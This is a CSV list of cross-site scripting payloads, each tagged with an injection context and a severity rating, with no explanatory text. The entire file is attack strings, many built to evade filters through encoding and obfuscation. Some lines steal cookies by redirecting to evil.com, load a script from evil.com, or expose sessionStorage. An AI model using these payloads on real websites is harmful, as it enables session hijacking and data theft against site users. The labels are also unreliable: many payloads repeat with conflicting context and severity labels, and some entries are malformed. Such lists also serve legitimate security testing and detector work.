payload,context,severity
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,low
' onmouseover=alert(1) ',script_injection,medium
javascript:alert(1),js_uri,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"document.write(	""<img src
=x onerror
=alert(	1)>"")",dom_sink,medium
\' onerror=alert(1)//,attribute_escape,medium
<SCRipT>D.inNeRhTMl+='';</sCriPt>,attribute_escape,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"data:text/html,<script>alert(1)</script>",template_injection,low
"<audio>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
onerror=alert(0);>,tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
confirm(),tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>",js_uri,low
.alert(1);,tag_injection,medium
javascript:al'+'ert(1),js_uri,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
&lt;img src=x onerror=alert(1)&gt;,tag_injection,medium
"eval(""alert(1)"")",dom_sink,low
"""><ImG SrC=X OnErRoR=AlErT(1)>",attribute_escape,low
<%= aLeRt(1) %>,script_injection,low
"""><svg
 onload=alert(1)>",attribute_escape,medium
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
"<vIdeO><sourCe onerror&#61;""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute_escape,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
<%= alert(1) %>,template_injection,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",attribute_escape,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,high
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,low
alert(1),tag_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
<svgonload=alert(1)>,tag_injection,medium
"<object data=""javaSCRIPT:alert(1)"">",tag_injection,high
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,script_injection,high
"data:text/html,<script>alert(1)</script>",dom_sink,low
alert(1);,tag_injection,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
"\"" onerror=alert(1)//",attribute_escape,medium
confirm(),tag_injection,medium
' onerror=alert(1) x=',attribute_escape,high
"\"" onload=alert(1)//",dom_sink,low
&lt;video src=x onerror=alert(1)&gt;,tag_injection,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
<img/’onerror=alert(1) src=a>,tag_injection,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",event_handler,low
"setTimeout(""alert(1)"",0)",attribute_escape,medium
\' onerror=alert(1)//,js_uri,low
\' onerror=confirm(1)//,attribute_escape,low
javascript:confirm(1),js_uri,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><svg onload=alert(document.cookie)>",tag_injection,medium
%3Cimg/src=%3Dx+onload=self.alert(1)%3D,attribute_escape,medium
<img/src/onerror=alert(1),tag_injection,medium
"<details open ontoggle
=alert(	1)>",event_handler,low
""" onerror=alert(1) x=""",js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<svg onload=alert(1)>,event_handler,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"eval(""alert(1)"")",dom_sink,high
innerHTML=location.hash>#<textarea>alert(1)</script>,tag_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"//--></SCRIPT><img>alert(String.fromCharCode(88,83,83));",tag_injection,high
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<input onfocus=alert(1) autofocus>,event_handler,high
<svgonload=alert(1)>,tag_injection,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
<details open ontoggle=alert(1)>,event_handler,medium
#{alert(1)},template_injection,low
<svgonload=alert(1)>,tag_injection,medium
<img src=x onerror=confirm(1)>,attribute_escape,low
""" onload=alert(1) x=""",attribute_escape,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
\' onerror=alert(1)//,script_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
-alert(23)/,tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
"\"" onerror=confirm(1)//",js_uri,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",tag_injection,high
%3Csvg%20onload=alert(1)%3E,tag_injection,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"onerror=""alert(1)""",tag_injection,medium
""" onerror
=alert(	1) x
=""",attribute_escape,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
' onmouseover=alert(1) ',attribute_escape,low
<svg onload=alert()>,tag_injection,medium
javascript:alert(document.domain),attribute_escape,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,low
jAvAsCrIpT:CoNfIrM(1),script_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
<script>alert(document.domain)</script>,script_injection,low
"""><script
 alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
<SCRIPT>alert(1)</SCRIPT>,js_uri,high
"<video>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
{{7*7}},template_injection,low
"""><script
>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
<BODY ONLOAD=alert(8839)>,attribute_escape,medium
"&quot; onerror
=alert(	1) x
=&quot;",script_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",attribute_escape,low
<img/src=x onerror=alert(1)//>,event_handler,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
OnloAD='aLeRT(1)',tag_injection,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",attribute_escape,high
"#""><svg onload=alert(1)>",attribute_escape,medium
onerror=alert(0);>,tag_injection,medium
%3Cscript%3Eprompt(1)%3C/script%3E,script_injection,high
"?alert(1)"",",tag_injection,medium
' onerror=alert(1) x=',attribute_escape,high
onerror=alert(0);>,tag_injection,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",script_injection,high
</script><svg onload=alert(1)>,tag_injection,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
;alert(1);,tag_injection,medium
javascript:confirm(1),js_uri,medium
-prompt(1)/,attribute_escape,medium
<BODY ONLOAD=alert(’XSS’)>,tag_injection,medium
"data:text/html,<script>confirm(1)</script>",js_uri,high
{{7*7}},script_injection,low
"<VIDeO><SouRcE ONErROR=""['Al\U0065'+'Rt'][0]['\x63OnsTRUctOr']['\X63OnStRUCTOr']('retURn tHIS')()[['aL\u0065'+'rT'][0]]([stRING.froMCharCoDE(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute_escape,high
#{\u0061\u006cert(1)},template_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"eval(""alert(1)"")",dom_sink,medium
&quot; onload=alert(1) x=&quot;,attribute_escape,high
"\"" onerror=alert(1)//",attribute_escape,medium
<marquee onstart=alert(1)>,event_handler,low
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,medium
<body onload=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
alert(1),tag_injection,medium
<svg onload=alert(1)>,event_handler,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
onerror=alert(0);>,tag_injection,medium
<details open ontoggle=alert(1)>,event_handler,low
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"?alert(1)"",",tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
<img src=x onerror=al'+'ert(1)>,event_handler,low
onload='alert(1)',tag_injection,medium
<svg/onload=alert(1)>,tag_injection,high
javaSCRIPT:alert(document.domain),js_uri,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"""><body>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<svg onload=alert(1)>,tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
foo\’; alert(document.cookie);//’;,script_injection,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,low
<svg/onload=confirm(1)>,template_injection,medium
"OneRrOR=""aLert(1)""",tag_injection,medium
' onmouseover=al'+'ert(1) ',attribute_escape,high
\x3csvg/onload=alert(1)\x3e,tag_injection,high
""">< svg onload=alert()>",tag_injection,medium
"""><svg src=x onerror=alert(1)>",attribute_escape,high
<script>alert(	1)</script>,script_injection,high
"""><audio>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<svg/onresize=alert(String.fromCharCode(88,83,83))>",attribute_escape,high
<svgonload=alert(1)>,tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
javascript:alert(document.domain),tag_injection,high
\' OnErRoR=AlErT(1)//,attribute_escape,high
"%20""><svg onload=alert(1)>",tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
"\""&gt;&lt;img src=x onerror=alert(1)&gt;",dom_sink,medium
<svgonload=alert(1)>,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",tag_injection,high
"onload=""alert(1)""",tag_injection,medium
<svg onerror=alert()>,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
{{7*7}},template_injection,low
javascr/**/ipt:confirm(1),js_uri,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
confirm(),tag_injection,medium
;alert(1);,tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,attribute_escape,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
"location=""javascript:alert(1)""",js_uri,low
"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",attribute_escape,medium
<img src/onerror=prompt(8)>,tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"document.write(""<img src=x onerror=alert(1)>"")",template_injection,high
javascript:alert(document.domain),js_uri,medium
"\"" onerror
=alert(	1)//",attribute_escape,low
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,medium
"document.write(""<svg src=x onerror=alert(1)>"")",script_injection,high
""" onload=alert(1) x=""",script_injection,low
onerror=confirm(1);>,tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
ondblclick=alert(0);>,attribute_escape,medium
"onload=""confirm(1)""",tag_injection,medium
<svg/onload=alert(1)>,dom_sink,high
<img src=x onerror=alert(1)>,script_injection,low
"setTimeout(""alert(1)"",0)",dom_sink,medium
<img src=x onerror=alert(1)>,event_handler,high
<svg onload=alert()>,tag_injection,medium
#{alert(1)},script_injection,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,high
setInterval('ale'+'rt(10)');,tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"<meter>d.innerHTML+='';</script>//[""'`-->]]>]</div>",script_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,low
<script>alert(document.domain)</script>,script_injection,high
"<iframe src=""javascript:confirm(1)"">",attribute_escape,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,script_injection,medium
A” autofocus onfocus=alert(“XSS”)//,tag_injection,medium
\' onerror=alert(1)//,attribute_escape,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<det\u0061i\u006cs open ontogg\u006ce=\u0061\u006cert(1)>,event_handler,low
"\"" onerror=alert(1)//",template_injection,high
"\' onerror
=alert(	1)//",attribute_escape,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
<img src/onerror=prompt(8)>,tag_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
<svg/onload=alert(1)>,tag_injection,high
' ><svg src=x onerror=alert(1)>,event_handler,medium
onload='alert(1)',attribute_escape,medium
"""><img src=x onerror=alert(1)>",attribute_escape,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
javascript:confirm(document.domain),attribute_escape,medium
"eval(""alert(1)"")",event_handler,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
\u003cimg src onerror=confirm`1`\u003e,attribute_escape,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,medium
"""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",tag_injection,high
"%20""><svg onload=alert(1)>",tag_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute_escape,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"location=""javascript:alert(1)""",dom_sink,low
#{alert(1)},template_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
<input onfocus=alert(1) autofocus>,event_handler,high
<input onfocus=alert(1) autofocus>,event_handler,high
\' onerror=confirm(1)//,attribute_escape,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
<marquee onstart=alert(1)>,event_handler,high
%3Csvg/onload=alert(1)%3E,js_uri,medium
onerror=alert;throw 23;,tag_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
ondblclick='alert(1)',attribute_escape,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
alert(2),tag_injection,medium
' ><img src=x onload=alert(1)>,attribute_escape,low
"onload=""alert(document.domain)""",tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
' onmouseover=alert(1) ',template_injection,medium
"?alert(1)"",",tag_injection,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
javascript:alert(	1),attribute_escape,medium
"""><script	>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"eval(""alert(1)"")",dom_sink,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
&quot; onerror=alert(1) x=&quot;,dom_sink,low
"<img/src
=x onerror
=alert(	1)//>",tag_injection,high
javascript:confirm(1),attribute_escape,low
javascript:alert(1),event_handler,medium
<body onload=confirm(1)>,attribute_escape,medium
javascript:alert(1),dom_sink,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<body onload=alert(1)>,event_handler,medium
<marquee onstart=alert(1)>,event_handler,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
"\""><img src=x onload=alert(1)>",attribute_escape,medium
<marquee onstart=alert(1)>,event_handler,high
"' ><img src
=x onerror
=alert(	1)>",attribute_escape,high
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
<script>alert(1)</script>,script_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,high
<svgonmouseover=alert(1)>,attribute_escape,medium
<svgonload=alert(1)>,tag_injection,medium
<img src=x onerror=alert(1)>,event_handler,low
<svg onload=alert(1)>,tag_injection,medium
alert(1);,tag_injection,medium
"<svg
 onload=alert()>",tag_injection,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<img src=x onerror=alert(1)>,attribute_escape,medium
${al'+'ert(1)},template_injection,medium
<svg////////onload=alert(1)>,tag_injection,medium
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,low
"location=""javascript:alert(1)""",dom_sink,low
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<svg/onload=alert(1)>,tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
onerror='alert(1)',tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
' onerror=confirm(1) x=',template_injection,high
</tag><svg onload=alert(1)>,attribute_escape,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"setTimeout(""confirm(1)"",0)",dom_sink,high
onauxclick=alert(0);>,tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),attribute_escape,medium
<iframe/onload=alert(0);>,tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
javascript:alert(document.domain),js_uri,low
alert(document.cookie);,attribute_escape,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
javascript:confirm(1),js_uri,low
"onerror=""alert(1)""",tag_injection,medium
<scr/**/ipt>confirm(1)</scr/**/ipt>,script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,medium
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",js_uri,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
&quot; onerror=alert(1) x=&quot;,script_injection,low
alert(2),tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"""><math>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
oNErROR=aLERt(0);>,tag_injection,medium
<svg/onload=alert(1)>,tag_injection,low
javascript:alert(1),js_uri,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"location=""javascript:al'+'ert(1)""",dom_sink,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"document.write(""<svg src=x onerror=alert(1)>"")",dom_sink,medium
<script>confirm(1)</script>,script_injection,medium
onerror='alert(1)',tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
<script>alert(document.domain)</script>,script_injection,medium
+alert(1)+,tag_injection,medium
confirm(),tag_injection,medium
<video src=x onerror=alert(1)>,event_handler,low
<svg/onload=alert(1)>,tag_injection,medium
<iframe/onload=alert(0);>,tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
innerHTML=location.hash>#< script>alert(1)</script>,attribute_escape,high
onblur=”alert(‘AnonKryptiQuz’),tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"setTimeout(""\u0061\u006cert(1)"",0)",template_injection,medium
"&quot; onerror
=alert(	1) x
=&quot;",attribute_escape,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<script>alert(	document.domain)</script>,script_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
<img/src=x onerror=alert(1)//>,event_handler,medium
{{7*7}},template_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
<image src/onerror=alert(1)>,tag_injection,medium
{{7*7}},template_injection,low
<body on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,low
<img src/onerror=alert(1)>,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
#*/confirm(1),tag_injection,medium
<%= alert(1) %>,template_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
prompt(9),tag_injection,medium
<video src=x onerror=al'+'ert(1)>,event_handler,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
<image src/onerror=alert(1)>,tag_injection,medium
inneRHTML=lOcATIon.hasH>#<sCRIPt>AlERt(1)</sCriPT>,tag_injection,high
"<img>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<img/src=x onerror=alert(1)//>,event_handler,high
<img src=x onerror=alert(1)>,tag_injection,low
' onmouseover=alert(1) ',attribute_escape,low
""" onerror=alert(1) x=""",tag_injection,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
</tag><svg onload=alert(1)>,tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
<script>alert(1)</script>,js_uri,high
"location=""javascript:confirm(1)""",dom_sink,high
"<object data=""javascript:alert(1)"">",js_uri,medium
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
prompt(9),tag_injection,medium
' onerror=alert(1) x=',tag_injection,high
<script>alert(document.domain)</script>,script_injection,low
<svg/onload=confirm(1)>,js_uri,high
""" onerror=alert(1) x=""",attribute_escape,high
onload=”alert(‘AnonKryptiQuz’),attribute_escape,medium
<svg/onload=alert(1)>,tag_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"document.write(""%3Cimg src=x onerror=alert(1)%3E"")",attribute_escape,medium
alert(2),tag_injection,medium
onload='alert(1)',tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
alert(1),tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
"\""><img src=x onerror=alert(1)>",js_uri,low
${alert(1)},template_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<sVG onload=AlerT()>,tag_injection,medium
"alert(1))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
alert(2),tag_injection,medium
"<embed>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"""><ScRIPT ALeRt(STrInG.fROMCHARCODE(88,83,83))</sCrIpt>",tag_injection,high
onerror='alert(1)',tag_injection,medium
#{confirm(1)},template_injection,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"\""%3E%3Cimg src=x onerror=alert(1)%3E",attribute_escape,medium
"location=""javascr/**/ipt:alert(1)""",dom_sink,low
alert`1`,attribute_escape,medium
"{{constructor.constructor(""alert(1)"")()}}",attribute_escape,high
"<img src
=x onerror
=alert(	1)>",event_handler,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
<math onload=alert()>,tag_injection,medium
<svg/onload=alert(1)>,tag_injection,low
<script>confirm(1)</script>,script_injection,medium
\u003cimg src onchange=alert(1)\u003e,attribute_escape,medium
<svgonload=alert(1)>,tag_injection,medium
"\"" OnErRoR=AlErT(1)//",attribute_escape,high
' onmouseover=alert(1) ',attribute_escape,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
alert(document.domain);,tag_injection,medium
' onload=alert(1) x=',attribute_escape,medium
<body onload=alert(1)>,event_handler,medium
"javascript:void(document.location=""http://evil.com"")",event_handler,low
' onerror=\u0061\u006cert(1) x=',attribute_escape,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
OnloAD=”ALErT(‘ANOnkrYPtIqUz’),attribute_escape,medium
""" onload=confirm(1) x=""",attribute_escape,low
<input onfocus=alert(1) autofocus>,attribute_escape,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
<video src=x onload=alert(1)>,event_handler,low
